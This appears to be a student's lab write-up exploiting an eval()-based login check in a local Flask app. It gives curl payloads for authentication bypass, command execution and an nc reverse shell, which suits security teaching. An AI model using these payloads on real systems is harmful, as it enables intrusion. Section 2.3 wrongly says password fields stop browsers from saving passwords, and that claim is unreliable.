# 2
## 2.1
```
Werkzeug/2.3.6 Python/3.10.6
```

## 2.2
```
curl -v 127.0.0.1:5000/login
```

```html
<!DOCTYPE html>
<html>
    <head><title>CoviDIoT - Login </title></head>
    <body>
        <h1>CoviDIoT - Login</h1>
        
        <form method=POST>
            Username: <input type="text" name="username"/><br/>
            Password: <input type="password" name="password"/><br/>
            <button>Login</button>
        </form>
    </body>
</html>
```

## 2.3
The inputs are of type text and password, which means that the browser will not save the values entered by the user. This is a security measure to prevent the browser from saving the password in plain text.


## 2.4
```
curl -v 127.0.0.1:5000/login/ -X POST -d "username=alice&password=1234"
```

# 3
## 3.1
```bash
curl -v 127.0.0.1:5000/login/ -X POST -d "username=admin&password=anything' or '"
```

If we take the method:
```python
def passcheck(user, password):
    return eval("'%s' == 'admin' and '%s' == supersecretpassword" % (user,password))
```

Then the above evaluates to:
```python
def passcheck(user, password):
    return eval("'admin' == 'admin' and 'anything' or '' == supersecretpassword")
```

## 3.2
```bash
curl -v 127.0.0.1:5000/login/ -X POST -d "username=admin&password=anything' and os.system('ls') or '"
```

Which evaluates to:
```python
def passcheck(user, password):
    return eval("'admin' == 'admin' and 'anything' and os.system('ls') or '' == supersecretpassword")
```

## 3.3
```bash
curl -v 127.0.0.1:5000/login/ -X POST -d "username=admin&password=anything' and os.system('nc 127.0.0.1 4444 -ve /bin/sh') or '"
```
